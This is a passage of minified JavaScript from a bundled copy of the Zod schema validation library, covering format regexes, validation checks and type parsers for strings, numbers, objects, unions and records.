instead.")}};oU={};x0={};lN(x0,{unwrapMessage:()=>RQ,stringifyPrimitive:()=>KK,required:()=>kd1,randomString:()=>Ld1,propertyKeyTypes:()=>Nw,promiseAllObject:()=>Rd1,primitiveTypes:()=>wd1,prefixIssues:()=>NX,pick:()=>Pd1,partial:()=>_d1,optionalKeys:()=>ww,omit:()=>Sd1,numKeys:()=>Dd1,nullish:()=>EW,normalizeParams:()=>t1,merge:()=>Td1,jsonStringifyReplacer:()=>Rw,joinValues:()=>sU,issue:()=>Cw,isPlainObject:()=>fQ,isObject:()=>xQ,getSizableOrigin:()=>bd1,getParsedType:()=>Nd1,getLengthableOrigin:()=>_W,getEnumValues:()=>Aw,getElementAtPath:()=>Ad1,floatSafeRemainder:()=>Lw,finalizeIssue:()=>g8,extend:()=>Ed1,escapeRegex:()=>u5,esc:()=>S5,defineLazy:()=>f0,createTransparentProxy:()=>Id1,clone:()=>CX,cleanRegex:()=>TW,cleanEnum:()=>vd1,captureStackTrace:()=>UK,cached:()=>SW,assignProp:()=>zK,assertNotEqual:()=>Md1,assertNever:()=>Fd1,assertIs:()=>jd1,assertEqual:()=>Zd1,assert:()=>Od1,allowsEval:()=>Dw,aborted:()=>T5,NUMBER_FORMAT_RANGES:()=>Iw,Class:()=>Pw,BIGINT_FORMAT_RANGES:()=>Cd1});UK=Error.captureStackTrace?Error.captureStackTrace:(...X)=>{};Dw=SW(()=>{if(typeof navigator<"u"&&navigator?.userAgent?.includes("Cloudflare"))return!1;try{return new Function(""),!0}catch(X){return!1}});Nw=new Set(["string","number","symbol"]),wd1=new Set(["string","number","bigint","boolean","symbol","undefined"]);Iw={safeint:[Number.MIN_SAFE_INTEGER,Number.MAX_SAFE_INTEGER],int32:[-2147483648,2147483647],uint32:[0,4294967295],float32:[-340282346638528860000000000000000000000,340282346638528860000000000000000000000],float64:[-Number.MAX_VALUE,Number.MAX_VALUE]},Cd1={int64:[BigInt("-9223372036854775808"),BigInt("9223372036854775807")],uint64:[BigInt(0),BigInt("18446744073709551615")]};Ew=W1("$ZodError",Sw),Tw=W1("$ZodError",Sw,{Parent:Error});gd1=_w(Tw),md1=kw(Tw),ud1=/^[cC][^\s-]{8,}$/,cd1=/^[0-9a-z]+$/,ld1=/^[0-9A-HJKMNP-TV-Za-hjkmnp-tv-z]{26}$/,pd1=/^[0-9a-vA-V]{20}$/,dd1=/^[A-Za-z0-9]{27}$/,id1=/^[a-zA-Z0-9_-]{21}$/,rd1=/^P(?:(\d+W)|(?!.*W)(?=\d|T\d)(\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+([.,]\d+)?S)?)?)$/,nd1=/^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$/,ad1=/^(?!\.)(?!.*\.\.)([A-Za-z0-9_'+\-\.]*)[A-Za-z0-9_+-]@([A-Za-z0-9][A-Za-z0-9\-]*\.)+[A-Za-z]{2,}$/;td1=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,ed1=/^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|::|([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:?){0,6})$/,Xi1=/^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/([0-9]|[1-2][0-9]|3[0-2])$/,Qi1=/^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|::|([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:?){0,6})\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,Ji1=/^$|^(?:[0-9a-zA-Z+/]{4})*(?:(?:[0-9a-zA-Z+/]{2}==)|(?:[0-9a-zA-Z+/]{3}=))?$/,bw=/^[A-Za-z0-9_-]*$/,Yi1=/^([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+$/,Wi1=/^\+(?:[0-9]){6,14}[0-9]$/,Gi1=new RegExp(`^${vw}$`);Ui1=/^\d+$/,Ki1=/^-?\d+(?:\.\d+)?/i,Vi1=/true|false/i,Bi1=/null/i,qi1=/^[^A-Z]*$/,Zi1=/^[^a-z]*$/,p9=W1("$ZodCheck",(X,Q)=>{var J;X._zod??(X._zod={}),X._zod.def=Q,(J=X._zod).onattach??(J.onattach=[])}),fw={number:"number",bigint:"bigint",object:"date"},hw=W1("$ZodCheckLessThan",(X,Q)=>{p9.init(X,Q);let J=fw[typeof Q.value];X._zod.onattach.push((Y)=>{let W=Y._zod.bag,G=(Q.inclusive?W.maximum:W.exclusiveMaximum)??Number.POSITIVE_INFINITY;if(Q.value<G)if(Q.inclusive)W.maximum=Q.value;else W.exclusiveMaximum=Q.value}),X._zod.check=(Y)=>{if(Q.inclusive?Y.value<=Q.value:Y.value<Q.value)return;Y.issues.push({origin:J,code:"too_big",maximum:Q.value,input:Y.value,inclusive:Q.inclusive,inst:X,continue:!Q.abort})}}),yw=W1("$ZodCheckGreaterThan",(X,Q)=>{p9.init(X,Q);let J=fw[typeof Q.value];X._zod.onattach.push((Y)=>{let W=Y._zod.bag,G=(Q.inclusive?W.minimum:W.exclusiveMinimum)??Number.NEGATIVE_INFINITY;if(Q.value>G)if(Q.inclusive)W.minimum=Q.value;else W.exclusiveMinimum=Q.value}),X._zod.check=(Y)=>{if(Q.inclusive?Y.value>=Q.value:Y.value>Q.value)return;Y.issues.push({origin:J,code:"too_small",minimum:Q.value,input:Y.value,inclusive:Q.inclusive,inst:X,continue:!Q.abort})}}),Mi1=W1("$ZodCheckMultipleOf",(X,Q)=>{p9.init(X,Q),X._zod.onattach.push((J)=>{var Y;(Y=J._zod.bag).multipleOf??(Y.multipleOf=Q.value)}),X._zod.check=(J)=>{if(typeof J.value!==typeof Q.value)throw Error("Cannot mix number and bigint in multiple_of check.");if(typeof J.value==="bigint"?J.value%Q.value===BigInt(0):Lw(J.value,Q.value)===0)return;J.issues.push({origin:typeof J.value,code:"not_multiple_of",divisor:Q.value,input:J.value,inst:X,continue:!Q.abort})}}),ji1=W1("$ZodCheckNumberFormat",(X,Q)=>{p9.init(X,Q),Q.format=Q.format||"float64";let J=Q.format?.includes("int"),Y=J?"int":"number",[W,G]=Iw[Q.format];X._zod.onattach.push((H)=>{let $=H._zod.bag;if($.format=Q.format,$.minimum=W,$.maximum=G,J)$.pattern=Ui1}),X._zod.check=(H)=>{let $=H.value;if(J){if(!Number.isInteger($)){H.issues.push({expected:Y,format:Q.format,code:"invalid_type",input:$,inst:X});return}if(!Number.isSafeInteger($)){if($>0)H.issues.push({input:$,code:"too_big",maximum:Number.MAX_SAFE_INTEGER,note:"Integers must be within the safe integer range.",inst:X,origin:Y,continue:!Q.abort});else H.issues.push({input:$,code:"too_small",minimum:Number.MIN_SAFE_INTEGER,note:"Integers must be within the safe integer range.",inst:X,origin:Y,continue:!Q.abort});return}}if($<W)H.issues.push({origin:"number",input:$,code:"too_small",minimum:W,inclusive:!0,inst:X,continue:!Q.abort});if($>G)H.issues.push({origin:"number",input:$,code:"too_big",maximum:G,inst:X})}}),Fi1=W1("$ZodCheckMaxLength",(X,Q)=>{p9.init(X,Q),X._zod.when=(J)=>{let Y=J.value;return!EW(Y)&&Y.length!==void 0},X._zod.onattach.push((J)=>{let Y=J._zod.bag.maximum??Number.POSITIVE_INFINITY;if(Q.maximum<Y)J._zod.bag.maximum=Q.maximum}),X._zod.check=(J)=>{let Y=J.value;if(Y.length<=Q.maximum)return;let G=_W(Y);J.issues.push({origin:G,code:"too_big",maximum:Q.maximum,inclusive:!0,input:Y,inst:X,continue:!Q.abort})}}),Oi1=W1("$ZodCheckMinLength",(X,Q)=>{p9.init(X,Q),X._zod.when=(J)=>{let Y=J.value;return!EW(Y)&&Y.length!==void 0},X._zod.onattach.push((J)=>{let Y=J._zod.bag.minimum??Number.NEGATIVE_INFINITY;if(Q.minimum>Y)J._zod.bag.minimum=Q.minimum}),X._zod.check=(J)=>{let Y=J.value;if(Y.length>=Q.minimum)return;let G=_W(Y);J.issues.push({origin:G,code:"too_small",minimum:Q.minimum,inclusive:!0,input:Y,inst:X,continue:!Q.abort})}}),Ai1=W1("$ZodCheckLengthEquals",(X,Q)=>{p9.init(X,Q),X._zod.when=(J)=>{let Y=J.value;return!EW(Y)&&Y.length!==void 0},X._zod.onattach.push((J)=>{let Y=J._zod.bag;Y.minimum=Q.length,Y.maximum=Q.length,Y.length=Q.length}),X._zod.check=(J)=>{let Y=J.value,W=Y.length;if(W===Q.length)return;let G=_W(Y),H=W>Q.length;J.issues.push({origin:G,...H?{code:"too_big",maximum:Q.length}:{code:"too_small",minimum:Q.length},inclusive:!0,exact:!0,input:J.value,inst:X,continue:!Q.abort})}}),kW=W1("$ZodCheckStringFormat",(X,Q)=>{var J,Y;if(p9.init(X,Q),X._zod.onattach.push((W)=>{let G=W._zod.bag;if(G.format=Q.format,Q.pattern)G.patterns??(G.patterns=new Set),G.patterns.add(Q.pattern)}),Q.pattern)(J=X._zod).check??(J.check=(W)=>{if(Q.pattern.lastIndex=0,Q.pattern.test(W.value))return;W.issues.push({origin:"string",code:"invalid_format",format:Q.format,input:W.value,...Q.pattern?{pattern:Q.pattern.toString()}:{},inst:X,continue:!Q.abort})});else(Y=X._zod).check??(Y.check=()=>{})}),Ri1=W1("$ZodCheckRegex",(X,Q)=>{kW.init(X,Q),X._zod.check=(J)=>{if(Q.pattern.lastIndex=0,Q.pattern.test(J.value))return;J.issues.push({origin:"string",code:"invalid_format",format:"regex",input:J.value,pattern:Q.pattern.toString(),inst:X,continue:!Q.abort})}}),Li1=W1("$ZodCheckLowerCase",(X,Q)=>{Q.pattern??(Q.pattern=qi1),kW.init(X,Q)}),Di1=W1("$ZodCheckUpperCase",(X,Q)=>{Q.pattern??(Q.pattern=Zi1),kW.init(X,Q)}),Ni1=W1("$ZodCheckIncludes",(X,Q)=>{p9.init(X,Q);let J=u5(Q.includes),Y=new RegExp(typeof Q.position==="number"?`^.{${Q.position}}${J}`:J);Q.pattern=Y,X._zod.onattach.push((W)=>{let G=W._zod.bag;G.patterns??(G.patterns=new Set),G.patterns.add(Y)}),X._zod.check=(W)=>{if(W.value.includes(Q.includes,Q.position))return;W.issues.push({origin:"string",code:"invalid_format",format:"includes",includes:Q.includes,input:W.value,inst:X,continue:!Q.abort})}}),wi1=W1("$ZodCheckStartsWith",(X,Q)=>{p9.init(X,Q);let J=new RegExp(`^${u5(Q.prefix)}.*`);Q.pattern??(Q.pattern=J),X._zod.onattach.push((Y)=>{let W=Y._zod.bag;W.patterns??(W.patterns=new Set),W.patterns.add(J)}),X._zod.check=(Y)=>{if(Y.value.startsWith(Q.prefix))return;Y.issues.push({origin:"string",code:"invalid_format",format:"starts_with",prefix:Q.prefix,input:Y.value,inst:X,continue:!Q.abort})}}),Ii1=W1("$ZodCheckEndsWith",(X,Q)=>{p9.init(X,Q);let J=new RegExp(`.*${u5(Q.suffix)}$`);Q.pattern??(Q.pattern=J),X._zod.onattach.push((Y)=>{let W=Y._zod.bag;W.patterns??(W.patterns=new Set),W.patterns.add(J)}),X._zod.check=(Y)=>{if(Y.value.endsWith(Q.suffix))return;Y.issues.push({origin:"string",code:"invalid_format",format:"ends_with",suffix:Q.suffix,input:Y.value,inst:X,continue:!Q.abort})}}),Ci1=W1("$ZodCheckOverwrite",(X,Q)=>{p9.init(X,Q),X._zod.check=(J)=>{J.value=Q.tx(J.value)}});Pi1={major:4,minor:0,patch:0},h0=W1("$ZodType",(X,Q)=>{var J;X??(X={}),X._zod.def=Q,X._zod.bag=X._zod.bag||{},X._zod.version=Pi1;let Y=[...X._zod.def.checks??[]];if(X._zod.traits.has("$ZodCheck"))Y.unshift(X);for(let W of Y)for(let G of W._zod.onattach)G(X);if(Y.length===0)(J=X._zod).deferred??(J.deferred=[]),X._zod.deferred?.push(()=>{X._zod.run=X._zod.parse});else{let W=(G,H,$)=>{let z=T5(G),U;for(let K of H){if(K._zod.when){if(!K._zod.when(G))continue}else if(z)continue;let B=G.issues.length,q=K._zod.check(G);if(q instanceof Promise&&$?.async===!1)throw new f5;if(U||q instanceof Promise)U=(U??Promise.resolve()).then(async()=>{if(await q,G.issues.length===B)return;if(!z)z=T5(G,B)});else{if(G.issues.length===B)continue;if(!z)z=T5(G,B)}}if(U)return U.then(()=>{return G});return G};X._zod.run=(G,H)=>{let $=X._zod.parse(G,H);if($ instanceof Promise){if(H.async===!1)throw new f5;return $.then((z)=>W(z,Y,H))}return W($,Y,H)}}X["~standard"]={validate:(W)=>{try{let G=gd1(X,W);return G.success?{value:G.data}:{issues:G.error?.issues}}catch(G){return md1(X,W).then((H)=>H.success?{value:H.data}:{issues:H.error?.issues})}},vendor:"zod",version:1}}),VK=W1("$ZodString",(X,Q)=>{h0.init(X,Q),X._zod.pattern=[...X?._zod.bag?.patterns??[]].pop()??zi1(X._zod.bag),X._zod.parse=(J,Y)=>{if(Q.coerce)try{J.value=String(J.value)}catch(W){}if(typeof J.value==="string")return J;return J.issues.push({expected:"string",code:"invalid_type",input:J.value,inst:X}),J}}),m0=W1("$ZodStringFormat",(X,Q)=>{kW.init(X,Q),VK.init(X,Q)}),Si1=W1("$ZodGUID",(X,Q)=>{Q.pattern??(Q.pattern=nd1),m0.init(X,Q)}),Ei1=W1("$ZodUUID",(X,Q)=>{if(Q.version){let Y={v1:1,v2:2,v3:3,v4:4,v5:5,v6:6,v7:7,v8:8}[Q.version];if(Y===void 0)throw Error(`Invalid UUID version: "${Q.version}"`);Q.pattern??(Q.pattern=NN(Y))}else Q.pattern??(Q.pattern=NN());m0.init(X,Q)}),Ti1=W1("$ZodEmail",(X,Q)=>{Q.pattern??(Q.pattern=ad1),m0.init(X,Q)}),_i1=W1("$ZodURL",(X,Q)=>{m0.init(X,Q),X._zod.check=(J)=>{try{let Y=J.value,W=new URL(Y),G=W.href;if(Q.hostname){if(Q.hostname.lastIndex=0,!Q.hostname.test(W.hostname))J.issues.push({code:"invalid_format",format:"url",note:"Invalid hostname",pattern:Yi1.source,input:J.value,inst:X,continue:!Q.abort})}if(Q.protocol){if(Q.protocol.lastIndex=0,!Q.protocol.test(W.protocol.endsWith(":")?W.protocol.slice(0,-1):W.protocol))J.issues.push({code:"invalid_format",format:"url",note:"Invalid protocol",pattern:Q.protocol.source,input:J.value,inst:X,continue:!Q.abort})}if(!Y.endsWith("/")&&G.endsWith("/"))J.value=G.slice(0,-1);else J.value=G;return}catch(Y){J.issues.push({code:"invalid_format",format:"url",input:J.value,inst:X,continue:!Q.abort})}}}),ki1=W1("$ZodEmoji",(X,Q)=>{Q.pattern??(Q.pattern=sd1()),m0.init(X,Q)}),bi1=W1("$ZodNanoID",(X,Q)=>{Q.pattern??(Q.pattern=id1),m0.init(X,Q)}),vi1=W1("$ZodCUID",(X,Q)=>{Q.pattern??(Q.pattern=ud1),m0.init(X,Q)}),xi1=W1("$ZodCUID2",(X,Q)=>{Q.pattern??(Q.pattern=cd1),m0.init(X,Q)}),fi1=W1("$ZodULID",(X,Q)=>{Q.pattern??(Q.pattern=ld1),m0.init(X,Q)}),hi1=W1("$ZodXID",(X,Q)=>{Q.pattern??(Q.pattern=pd1),m0.init(X,Q)}),yi1=W1("$ZodKSUID",(X,Q)=>{Q.pattern??(Q.pattern=dd1),m0.init(X,Q)}),gi1=W1("$ZodISODateTime",(X,Q)=>{Q.pattern??(Q.pattern=$i1(Q)),m0.init(X,Q)}),mi1=W1("$ZodISODate",(X,Q)=>{Q.pattern??(Q.pattern=Gi1),m0.init(X,Q)}),ui1=W1("$ZodISOTime",(X,Q)=>{Q.pattern??(Q.pattern=Hi1(Q)),m0.init(X,Q)}),ci1=W1("$ZodISODuration",(X,Q)=>{Q.pattern??(Q.pattern=rd1),m0.init(X,Q)}),li1=W1("$ZodIPv4",(X,Q)=>{Q.pattern??(Q.pattern=td1),m0.init(X,Q),X._zod.onattach.push((J)=>{let Y=J._zod.bag;Y.format="ipv4"})}),pi1=W1("$ZodIPv6",(X,Q)=>{Q.pattern??(Q.pattern=ed1),m0.init(X,Q),X._zod.onattach.push((J)=>{let Y=J._zod.bag;Y.format="ipv6"}),X._zod.check=(J)=>{try{new URL(`http://[${J.value}]`)}catch{J.issues.push({code:"invalid_format",format:"ipv6",input:J.value,inst:X,continue:!Q.abort})}}}),di1=W1("$ZodCIDRv4",(X,Q)=>{Q.pattern??(Q.pattern=Xi1),m0.init(X,Q)}),ii1=W1("$ZodCIDRv6",(X,Q)=>{Q.pattern??(Q.pattern=Qi1),m0.init(X,Q),X._zod.check=(J)=>{let[Y,W]=J.value.split("/");try{if(!W)throw Error();let G=Number(W);if(`${G}`!==W)throw Error();if(G<0||G>128)throw Error();new URL(`http://[${Y}]`)}catch{J.issues.push({code:"invalid_format",format:"cidrv6",input:J.value,inst:X,continue:!Q.abort})}}});ri1=W1("$ZodBase64",(X,Q)=>{Q.pattern??(Q.pattern=Ji1),m0.init(X,Q),X._zod.onattach.push((J)=>{J._zod.bag.contentEncoding="base64"}),X._zod.check=(J)=>{if(mw(J.value))return;J.issues.push({code:"invalid_format",format:"base64",input:J.value,inst:X,continue:!Q.abort})}});ai1=W1("$ZodBase64URL",(X,Q)=>{Q.pattern??(Q.pattern=bw),m0.init(X,Q),X._zod.onattach.push((J)=>{J._zod.bag.contentEncoding="base64url"}),X._zod.check=(J)=>{if(ni1(J.value))return;J.issues.push({code:"invalid_format",format:"base64url",input:J.value,inst:X,continue:!Q.abort})}}),oi1=W1("$ZodE164",(X,Q)=>{Q.pattern??(Q.pattern=Wi1),m0.init(X,Q)});ti1=W1("$ZodJWT",(X,Q)=>{m0.init(X,Q),X._zod.check=(J)=>{if(si1(J.value,Q.alg))return;J.issues.push({code:"invalid_format",format:"jwt",input:J.value,inst:X,continue:!Q.abort})}}),uw=W1("$ZodNumber",(X,Q)=>{h0.init(X,Q),X._zod.pattern=X._zod.bag.pattern??Ki1,X._zod.parse=(J,Y)=>{if(Q.coerce)try{J.value=Number(J.value)}catch(H){}let W=J.value;if(typeof W==="number"&&!Number.isNaN(W)&&Number.isFinite(W))return J;let G=typeof W==="number"?Number.isNaN(W)?"NaN":!Number.isFinite(W)?"Infinity":void 0:void 0;return J.issues.push({expected:"number",code:"invalid_type",input:W,inst:X,...G?{received:G}:{}}),J}}),ei1=W1("$ZodNumber",(X,Q)=>{ji1.init(X,Q),uw.init(X,Q)}),Xr1=W1("$ZodBoolean",(X,Q)=>{h0.init(X,Q),X._zod.pattern=Vi1,X._zod.parse=(J,Y)=>{if(Q.coerce)try{J.value=Boolean(J.value)}catch(G){}let W=J.value;if(typeof W==="boolean")return J;return J.issues.push({expected:"boolean",code:"invalid_type",input:W,inst:X}),J}}),Qr1=W1("$ZodNull",(X,Q)=>{h0.init(X,Q),X._zod.pattern=Bi1,X._zod.values=new Set([null]),X._zod.parse=(J,Y)=>{let W=J.value;if(W===null)return J;return J.issues.push({expected:"null",code:"invalid_type",input:W,inst:X}),J}}),Jr1=W1("$ZodUnknown",(X,Q)=>{h0.init(X,Q),X._zod.parse=(J)=>J}),Yr1=W1("$ZodNever",(X,Q)=>{h0.init(X,Q),X._zod.parse=(J,Y)=>{return J.issues.push({expected:"never",code:"invalid_type",input:J.value,inst:X}),J}});Wr1=W1("$ZodArray",(X,Q)=>{h0.init(X,Q),X._zod.parse=(J,Y)=>{let W=J.value;if(!Array.isArray(W))return J.issues.push({expected:"array",code:"invalid_type",input:W,inst:X}),J;J.value=Array(W.length);let G=[];for(let H=0;H<W.length;H++){let $=W[H],z=Q.element._zod.run({value:$,issues:[]},Y);if(z instanceof Promise)G.push(z.then((U)=>wN(U,J,H)));else wN(z,J,H)}if(G.length)return Promise.all(G).then(()=>J);return J}});Gr1=W1("$ZodObject",(X,Q)=>{h0.init(X,Q);let J=SW(()=>{let B=Object.keys(Q.shape);for(let Z of B)if(!(Q.shape[Z]instanceof h0))throw Error(`Invalid element at key "${Z}": expected a Zod schema`);let q=ww(Q.shape);return{shape:Q.shape,keys:B,keySet:new Set(B),numKeys:B.length,optionalKeys:new Set(q)}});f0(X._zod,"propValues",()=>{let B=Q.shape,q={};for(let Z in B){let M=B[Z]._zod;if(M.values){q[Z]??(q[Z]=new Set);for(let L of M.values)q[Z].add(L)}}return q});let Y=(B)=>{let q=new gw(["shape","payload","ctx"]),Z=J.value,M=(F)=>{let A=S5(F);return`shape[${A}]._zod.run({ value: input[${A}], issues: [] }, ctx)`};q.write("const input = payload.value;");let L=Object.create(null),R=0;for(let F of Z.keys)L[F]=`key_${R++}`;q.write("const newResult = {}");for(let F of Z.keys)if(Z.optionalKeys.has(F)){let A=L[F];q.write(`const ${A} = ${M(F)};`);let O=S5(F);q.write(`
        if (${A}.issues.length) {
          if (input[${O}] === undefined) {
            if (${O} in input) {
              newResult[${O}] = undefined;
            }
          } else {
            payload.issues = payload.issues.concat(
              ${A}.issues.map((iss) => ({
                ...iss,
                path: iss.path ? [${O}, ...iss.path] : [${O}],
              }))
            );
          }
        } else if (${A}.value === undefined) {
          if (${O} in input) newResult[${O}] = undefined;
        } else {
          newResult[${O}] = ${A}.value;
        }
        `)}else{let A=L[F];q.write(`const ${A} = ${M(F)};`),q.write(`
          if (${A}.issues.length) payload.issues = payload.issues.concat(${A}.issues.map(iss => ({
            ...iss,
            path: iss.path ? [${S5(F)}, ...iss.path] : [${S5(F)}]
          })));`),q.write(`newResult[${S5(F)}] = ${A}.value`)}q.write("payload.value = newResult;"),q.write("return payload;");let j=q.compile();return(F,A)=>j(B,F,A)},W,G=xQ,H=!oU.jitless,z=H&&Dw.value,U=Q.catchall,K;X._zod.parse=(B,q)=>{K??(K=J.value);let Z=B.value;if(!G(Z))return B.issues.push({expected:"object",code:"invalid_type",input:Z,inst:X}),B;let M=[];if(H&&z&&q?.async===!1&&q.jitless!==!0){if(!W)W=Y(Q.shape);B=W(B,q)}else{B.value={};let A=K.shape;for(let O of K.keys){let w=A[O],N=w._zod.run({value:Z[O],issues:[]},q),C=w._zod.optin==="optional"&&w._zod.optout==="optional";if(N instanceof Promise)M.push(N.then((_)=>C?IN(_,B,O,Z):GW(_,B,O)));else if(C)IN(N,B,O,Z);else GW(N,B,O)}}if(!U)return M.length?Promise.all(M).then(()=>B):B;let L=[],R=K.keySet,j=U._zod,F=j.def.type;for(let A of Object.keys(Z)){if(R.has(A))continue;if(F==="never"){L.push(A);continue}let O=j.run({value:Z[A],issues:[]},q);if(O instanceof Promise)M.push(O.then((w)=>GW(w,B,A)));else GW(O,B,A)}if(L.length)B.issues.push({code:"unrecognized_keys",keys:L,input:Z,inst:X});if(!M.length)return B;return Promise.all(M).then(()=>{return B})}});cw=W1("$ZodUnion",(X,Q)=>{h0.init(X,Q),f0(X._zod,"optin",()=>Q.options.some((J)=>J._zod.optin==="optional")?"optional":void 0),f0(X._zod,"optout",()=>Q.options.some((J)=>J._zod.optout==="optional")?"optional":void 0),f0(X._zod,"values",()=>{if(Q.options.every((J)=>J._zod.values))return new Set(Q.options.flatMap((J)=>Array.from(J._zod.values)));return}),f0(X._zod,"pattern",()=>{if(Q.options.every((J)=>J._zod.pattern)){let J=Q.options.map((Y)=>Y._zod.pattern);return new RegExp(`^(${J.map((Y)=>TW(Y.source)).join("|")})$`)}return}),X._zod.parse=(J,Y)=>{let W=!1,G=[];for(let H of Q.options){let $=H._zod.run({value:J.value,issues:[]},Y);if($ instanceof Promise)G.push($),W=!0;else{if($.issues.length===0)return $;G.push($)}}if(!W)return CN(G,J,X,Y);return Promise.all(G).then((H)=>{return CN(H,J,X,Y)})}}),Hr1=W1("$ZodDiscriminatedUnion",(X,Q)=>{cw.init(X,Q);let J=X._zod.parse;f0(X._zod,"propValues",()=>{let W={};for(let G of Q.options){let H=G._zod.propValues;if(!H||Object.keys(H).length===0)throw Error(`Invalid discriminated union option at index "${Q.options.indexOf(G)}"`);for(let[$,z]of Object.entries(H)){if(!W[$])W[$]=new Set;for(let U of z)W[$].add(U)}}return W});let Y=SW(()=>{let W=Q.options,G=new Map;for(let H of W){let $=H._zod.propValues[Q.discriminator];if(!$||$.size===0)throw Error(`Invalid discriminated union option at index "${Q.options.indexOf(H)}"`);for(let z of $){if(G.has(z))throw Error(`Duplicate discriminator value "${String(z)}"`);G.set(z,H)}}return G});X._zod.parse=(W,G)=>{let H=W.value;if(!xQ(H))return W.issues.push({code:"invalid_type",expected:"object",input:H,inst:X}),W;let $=Y.value.get(H?.[Q.discriminator]);if($)return $._zod.run(W,G);if(Q.unionFallback)return J(W,G);return W.issues.push({code:"invalid_union",errors:[],note:"No matching discriminator",input:H,path:[Q.discriminator],inst:X}),W}}),$r1=W1("$ZodIntersection",(X,Q)=>{h0.init(X,Q),X._zod.parse=(J,Y)=>{let W=J.value,G=Q.left._zod.run({value:W,issues:[]},Y),H=Q.right._zod.run({value:W,issues:[]},Y);if(G instanceof Promise||H instanceof Promise)return Promise.all([G,H]).then(([z,U])=>{return PN(J,z,U)});return PN(J,G,H)}});zr1=W1("$ZodRecord",(X,Q)=>{h0.init(X,Q),X._zod.parse=(J,Y)=>{let W=J.value;if(!fQ(W))return J.issues.push({expected:"record",code:"invalid_type",input:W,inst:X}),J;let G=[];if(Q.keyType._zod.values){let H=Q.keyType._zod.values;J.value={};for(let z of H)if(typeof z==="string"||typeof z==="number"||typeof z==="symbol"){let U=Q.valueType._zod.run({value:W[z],issues:[]},Y);if(U instanceof Promise)G.push(U.then((K)=>{if(K.issues.length)J.issues.push(...NX(z,K.issues));J.value[z]=K.value}));else{if(U.issues.length)J.issues.push(...NX(z,U.issues));J.value[z]=U.value}}let $;for(let z in W)if(!H.has(z))$=$??[],$.push(z);if($&&$.length>0)J.issues.push({code:"unrecognized_keys",input:W,inst:X,keys:$})}else{J.value={};for(let H of Reflect.ownKeys(W)){if(H==="__proto__")continue;let $=Q.keyType._zod.run({value:H,issues:[]},Y);if($ instanceof Promise)throw Error("Async schemas not supported in object keys currently");if($.issues.length){J.issues.push({origin:"record",code:"invalid_key",issues:$.issues.map((U)=>g8(U,Y,y8())),input:H,path:[H],inst:X}),J.value[$.value]=$.value;continue}let z=Q.valueType._zod.run({value:W[H],issues:[]},Y);if(z instanceof Promise)G.push(z.then((U)=>{if(U.issues.length)J.issues.push(...NX(H,U.issues));J.value[$.value]=U.value}));else{if(z.issues.length)J.issues.push(...NX(H,z.issues));J.value[$.value]=z.value}}}if(G.length)return Promise.all(G).then(()=>J);return J}}),Ur1=W1("$ZodEnum",(X,Q)=>{h0.init(X,Q);let J=Aw(Q.entries);X._zod.values=new Set(J),X._zod.pattern=new RegExp(`^(${J.filter((Y)=>Nw.has(typeof Y)).map((Y)=>typeof Y==="string"?u5(Y):Y.toString()).join("|")})$`),X._zod.parse=(Y,W)=>{let G=Y.value;if(X._zod.values.has(G))return Y;return Y.issues.push({code:"invalid_value",values:J,input:G,inst:X}),Y}}),Kr1=W1("$ZodLiteral",(X,Q)=>{h0.init(X,Q),X._zod.values=new Set(Q.values),X._zod.pattern=new RegExp(`^(${Q.values.map((J)=>typeof J==="string"?u5(J):J?J.toString():String(J)).join("|")})$`),X._zod.parse=(J,Y)=>{let W=J.value;if(X._zod.values.has(W))return J;return J.issues.push({code:"invalid_value",values:Q.values,input:W,inst:X}),J}}),Vr1=W1("$ZodTransform",(X,Q)=>{h0.init(X,Q),X._zod.parse=(J,Y)=>{let W=Q.transform(J.value,J);if(Y.async)return(W instanceof Promise?W:Promise.resolve(W)).then((H)=>{return J.value=H,J});if(W instanceof Promise)throw new f5;return J.value=W,J}}),Br1=W1("$ZodOptional",(X,Q)=>{h0.init(X,Q),X._zod.optin="optional",X._zod.optout="optional",f0(X._zod,"values",()=>{return Q.innerType._zod.values?new Set([...Q.innerType._zod.values,void 0]):void 0}),f0(X._zod,"pattern",()=>{let J=Q.innerType._zod.pattern;return J?new RegExp(`^(${TW(J.source)})?$`):void 0}),X._zod.parse=(J,Y)=>{if(Q.innerType._zod.optin==="optional")return Q.innerType._zod.run(J,Y);if(J.value===void 0)return J;return Q.innerType._zod.run(J,Y)}}),qr1=W1("$ZodNullable",(X,Q)=>{h0.init(X,Q),f0(X._zod,"optin",()=>Q.innerType._zod.optin),f0(X._zod,"optout",()=>Q.innerType._zod.optout),f0(X._zod,"pattern",()=>{let J=Q.innerType._zod.pattern;return J?new RegExp(`^(${TW(J.source)}|null)$`):void 0}),f0(X._zod,"values",()=>{return Q.innerType._zod.values?new Set([...Q.innerType._zod.values,null]):void 0}),X._zod.parse=(J,Y)=>{if(J.value===null)return J;return Q.innerType._zod.run(J,Y)}}),Zr1=W1("$ZodDefault",(X,Q)=>{h0.init(X,Q),X._zod.optin="optional",f0(X._zod,"values",()=>Q.innerType._zod.values),X._zod.parse=(J,Y)=>{if(J.value===void 0)return J.value=Q.defaultValue,J;let W=Q.innerType._zod.run(J,Y);if(W instanceof Promise)return W.then((G)=>SN(G,Q));return SN(W,Q)}});Mr1=W1("$ZodPrefault",(X,Q)=>{h0.init(X,Q),X._zod.optin="optional",f0(X._zod,"values",()=>Q.innerType._zod.values),X._zod.parse=(J,Y)=>{if(J.value===void 0)J.value=Q.defaultValue;return Q.innerType._zod.run(J,Y)}}),jr1=W1("$ZodNonOptional",(X,Q)=>{h0.init(X,Q),f0(X._zod,"values",()=>{let J=Q.innerType._zod.values;return J?new Set([...J].filter((Y)=>Y!==void 0)):void 0}),X._zod.parse=(J,Y)=>{let 